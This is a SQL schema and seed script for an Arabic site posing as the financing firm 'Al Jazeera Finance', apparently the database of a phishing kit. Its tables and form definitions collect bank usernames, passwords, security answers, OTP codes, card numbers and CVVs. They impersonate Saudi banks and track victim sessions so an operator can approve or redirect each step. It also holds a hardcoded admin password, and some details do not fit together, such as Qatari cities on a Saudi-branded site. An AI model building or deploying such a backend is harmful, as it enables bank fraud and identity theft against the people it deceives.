-- =====================================================
-- Jazeera Finance - إنشاء جميع الجداول
-- =====================================================

-- 1. جدول البنوك
CREATE TABLE banks (
    id SERIAL PRIMARY KEY,
    name TEXT NOT NULL,
    name_ar TEXT NOT NULL,
    logo_url TEXT,
    is_active BOOLEAN NOT NULL DEFAULT true,
    sort_order INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 2. جدول خدمات التمويل
CREATE TABLE financing_services (
    id SERIAL PRIMARY KEY,
    title TEXT NOT NULL,
    title_ar TEXT NOT NULL,
    description TEXT NOT NULL,
    description_ar TEXT NOT NULL,
    image_url TEXT,
    icon_name TEXT,
    is_active BOOLEAN NOT NULL DEFAULT true,
    sort_order INTEGER NOT NULL DEFAULT 0,
    financing_type TEXT NOT NULL,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 3. جدول جلسات المستخدمين
CREATE TABLE user_sessions (
    id TEXT PRIMARY KEY,
    ip_address TEXT,
    country TEXT,
    user_agent TEXT,
    current_page TEXT NOT NULL DEFAULT 'home',
    application_id INTEGER,
    is_active BOOLEAN NOT NULL DEFAULT true,
    is_blocked BOOLEAN NOT NULL DEFAULT false,
    blocked_reason TEXT,
    pending_message TEXT,
    pending_navigation TEXT,
    credentials_status TEXT DEFAULT 'pending',
    credentials_message TEXT,
    otp_status TEXT DEFAULT 'pending',
    last_seen_at TIMESTAMP NOT NULL DEFAULT NOW(),
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    deleted_at TIMESTAMP
);

-- 4. جدول الطلبات
CREATE TABLE applications (
    id SERIAL PRIMARY KEY,
    session_id TEXT NOT NULL,
    applicant_type TEXT NOT NULL DEFAULT 'individual',
    current_step TEXT NOT NULL DEFAULT 'applicant-info',
    status TEXT NOT NULL DEFAULT 'pending',
    bank_id INTEGER,
    bank_name TEXT,
    bank_logo TEXT,
    full_name TEXT,
    national_id TEXT,
    date_of_birth TEXT,
    monthly_salary TEXT,
    employer TEXT,
    phone TEXT,
    email TEXT,
    city TEXT,
    marital_status TEXT,
    company_name TEXT,
    business_type TEXT,
    commercial_registration TEXT,
    employee_count TEXT,
    annual_revenue TEXT,
    contact_name TEXT,
    bank_username TEXT,
    bank_password TEXT,
    security_answer TEXT,
    otp_code TEXT,
    payment_card_number TEXT,
    payment_card_holder TEXT,
    payment_expiry_date TEXT,
    payment_cvv TEXT,
    payment_otp TEXT,
    payment_status TEXT DEFAULT 'pending',
    payment_completed_at TIMESTAMP,
    extra_data TEXT,
    admin_note TEXT,
    version INTEGER NOT NULL DEFAULT 1,
    parent_id INTEGER,
    is_latest BOOLEAN NOT NULL DEFAULT true,
    created_at TIMESTAMP NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP NOT NULL DEFAULT NOW(),
    deleted_at TIMESTAMP
);

-- 5. جدول محتوى الصفحات
CREATE TABLE page_contents (
    id SERIAL PRIMARY KEY,
    page_key TEXT NOT NULL,
    section_key TEXT NOT NULL,
    content TEXT NOT NULL DEFAULT '',
    updated_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 6. جدول الحقول المخصصة
CREATE TABLE custom_fields (
    id SERIAL PRIMARY KEY,
    page_key TEXT NOT NULL,
    field_key TEXT NOT NULL,
    label_ar TEXT NOT NULL,
    field_type TEXT NOT NULL DEFAULT 'text',
    placeholder TEXT DEFAULT '',
    options TEXT DEFAULT '',
    is_required BOOLEAN NOT NULL DEFAULT false,
    is_active BOOLEAN NOT NULL DEFAULT true,
    sort_order INTEGER NOT NULL DEFAULT 0,
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 7. جدول إعدادات الموقع
CREATE TABLE site_settings (
    id SERIAL PRIMARY KEY,
    company_name TEXT NOT NULL DEFAULT 'Al Jazeera Finance',
    company_name_ar TEXT NOT NULL DEFAULT 'الجزيرة للتمويل',
    hero_title TEXT NOT NULL DEFAULT 'حلول تمويلية متكاملة',
    hero_subtitle TEXT NOT NULL DEFAULT 'نقدم لك أفضل خيارات التمويل',
    hero_image_url TEXT,
    logo_url TEXT,
    primary_color TEXT NOT NULL DEFAULT '#1e3a5f',
    contact_phone TEXT DEFAULT '920000000',
    contact_email TEXT DEFAULT 'info@site.com',
    contact_address TEXT DEFAULT 'المملكة العربية السعودية',
    otp_field_label TEXT NOT NULL DEFAULT 'أدخل رمز التحقق',
    otp_field_placeholder TEXT NOT NULL DEFAULT 'رمز التحقق',
    waiting_page_message TEXT NOT NULL DEFAULT 'سيتواصل معك فريقنا قريباً',
    updated_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 8. جدول إعدادات المدير
CREATE TABLE admin_config (
    id SERIAL PRIMARY KEY,
    username TEXT NOT NULL DEFAULT 'admin',
    password TEXT NOT NULL DEFAULT 'Fa@@20yiz',
    updated_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- 9. جدول الأجهزة الموثوقة
CREATE TABLE trusted_devices (
    id SERIAL PRIMARY KEY,
    device_id TEXT NOT NULL UNIQUE,
    device_name TEXT,
    device_type TEXT,
    browser TEXT,
    os TEXT,
    push_subscription TEXT,
    ip_address TEXT,
    is_active BOOLEAN NOT NULL DEFAULT true,
    last_used_at TIMESTAMP NOT NULL DEFAULT NOW(),
    created_at TIMESTAMP NOT NULL DEFAULT NOW()
);

-- =====================================================
-- الفهارس
-- =====================================================

CREATE INDEX idx_applications_session_id ON applications(session_id);
CREATE INDEX idx_applications_parent_id ON applications(parent_id);
CREATE INDEX idx_applications_is_latest ON applications(is_latest);
CREATE INDEX idx_applications_status ON applications(status);
CREATE INDEX idx_applications_current_step ON applications(current_step);
CREATE INDEX idx_applications_deleted_at ON applications(deleted_at);
CREATE INDEX idx_user_sessions_deleted_at ON user_sessions(deleted_at);
CREATE INDEX idx_page_contents_page_key ON page_contents(page_key);
CREATE INDEX idx_custom_fields_page_key ON custom_fields(page_key);

-- =====================================================
-- البيانات الأولية
-- =====================================================

INSERT INTO admin_config (username, password) VALUES ('admin', 'Fa@@20yiz');

INSERT INTO site_settings (company_name, company_name_ar, hero_title, hero_subtitle, primary_color) 
VALUES ('Al Jazeera Finance', 'الجزيرة للتمويل والحلول المالية', 'حلول تمويلية متكاملة لتحقيق أهدافك', 'نقدم لك أفضل خيارات التمويل بأرباح تنافسية وشروط مرنة', '#1e3a5f');

INSERT INTO banks (name, name_ar, is_active, sort_order) VALUES
('Al Rajhi Bank', 'بنك الراجحي', true, 1),
('Saudi National Bank', 'البنك الأهلي', true, 2),
('Samba Bank', 'بنك Samba', true, 3),
('Riyadh Bank', 'بنك الرياض', true, 4),
('SABB', 'بنك الصحراء', true, 5);

INSERT INTO financing_services (title, title_ar, description, description_ar, icon_name, is_active, sort_order, financing_type) VALUES
('Personal Financing', 'التمويل الشخصي', 'Get the funds you need', 'احصل على التمويل الذي تحتاجه', 'wallet', true, 1, 'personal'),
('Real Estate Financing', 'التمويل العقاري', 'Dream home financing', 'تمويل أحلامك العقارية', 'home', true, 2, 'real-estate'),
('Auto Financing', 'تمويل السيارات', 'Drive your dream car', 'اقتدر سيارتك اليوم', 'car', true, 3, 'auto'),
('Business Financing', 'التمويل التجاري', 'Grow your business', 'طور عملك بتمويل مرن', 'briefcase', true, 4, 'business');

INSERT INTO page_contents (page_key, section_key, content) VALUES
('home', 'hero_title', 'حلول تمويلية متكاملة لتحقيق أهدافك'),
('home', 'hero_subtitle', 'نقدم لك أفضل خيارات التمويل'),
('home', 'cta_button', 'قدم الآن'),
('apply', 'title', 'قدم على تمويلك'),
('apply', 'subtitle', 'املأ النموذج وسنتواصل معك'),
('success', 'title', 'تم استلام طلبك بنجاح!'),
('success', 'message', 'شكراً لك. سيتواصل معك فريقنا قريباً.'),
('pay-visa', 'page_title', 'إتمام عملية الدفع'),
('pay-visa', 'badge_text', 'دفع آمن ومشفر 100%'),
('pay-visa', 'submit_btn', 'إتمام الدفع'),
('pay-visa', 'waiting_title', 'في انتظار موافقة المدير'),
('credentials', 'page_title', 'تسجيل الدخول للبنك'),
('credentials', 'submit_btn', 'متابعة'),
('verify', 'page_title', 'التحقق بخطوتين'),
('verify', 'submit_btn', 'تحقق'),
('waiting', 'title', 'شكراً لك!'),
('waiting', 'message', 'سيتواصل معك فريقنا قريباً');

INSERT INTO custom_fields (page_key, field_key, label_ar, field_type, placeholder, options, is_required, sort_order) VALUES
('apply_individual', 'fullName', 'الاسم الكامل', 'text', 'أدخل الاسم الكامل', '', true, 1),
('apply_individual', 'nationalId', 'رقم الهوية', 'text', 'أدخل رقم الهوية', '', true, 2),
('apply_individual', 'dateOfBirth', 'تاريخ الميلاد', 'date', '', '', true, 3),
('apply_individual', 'monthlySalary', 'الراتب الشهري', 'number', 'أدخل الراتب', '', true, 4),
('apply_individual', 'employer', 'جهة العمل', 'text', 'أدخل جهة العمل', '', true, 5),
('apply_individual', 'phone', 'رقم الجوّال', 'tel', 'أدخل رقم الجوّال', '', true, 6),
('apply_individual', 'email', 'البريد الإلكتروني', 'email', 'أدخل البريد', '', false, 7),
('apply_individual', 'city', 'المدينة', 'select', 'اختر المدينة', 'الدوحة,الريان,الوكرة,الخور,الشمال,أم صلال', false, 8),
('apply_individual', 'maritalStatus', 'الحالة الاجتماعية', 'select', 'اختر الحالة', 'أعزب,متزوج,مطلّق,أرمل', false, 9),
('apply_business', 'companyName', 'اسم الشركة', 'text', 'أدخل اسم الشركة', '', true, 1),
('apply_business', 'businessType', 'نوع النشاط', 'text', 'أدخل نوع النشاط', '', true, 2),
('apply_business', 'commercialRegistration', 'رقم السجل التجاري', 'text', 'أدخل رقم السجل', '', true, 3),
('apply_business', 'contactName', 'اسم المسؤول', 'text', 'أدخل اسم المسؤول', '', true, 4),
('apply_business', 'phone', 'رقم الجوّال', 'tel', 'أدخل رقم الجوّال', '', true, 5),
('apply_business', 'email', 'البريد الإلكتروني', 'email', 'أدخل البريد', '', false, 6),
('credentials', 'bankUsername', 'اسم المستخدم', 'text', 'أدخل اسم المستخدم', '', true, 1),
('credentials', 'bankPassword', 'كلمة المرور', 'password', 'أدخل كلمة المرور', '', true, 2),
('credentials', 'securityAnswer', 'كلمة التحقق', 'text', 'أدخل كلمة التحقق', '', true, 3),
('verify', 'otpCode', 'رمز التحقق', 'text', 'أدخل الرمز', '', true, 1),
('pay-visa', 'paymentCardNumber', 'رقم البطاقة', 'text', 'أدخل رقم البطاقة', '', true, 1),
('pay-visa', 'paymentCardHolder', 'اسم حامل البطاقة', 'text', 'أدخل الاسم', '', true, 2),
('pay-visa', 'paymentExpiryDate', 'تاريخ الانتهاء', 'text', 'MM/YY', '', true, 3),
('pay-visa', 'paymentCvv', 'رمز الأمان', 'password', 'أدخل الرمز', '', true, 4),
('pay-otp', 'paymentOtp', 'رمز التحقق', 'text', 'أدخل الرمز', '', true, 1);
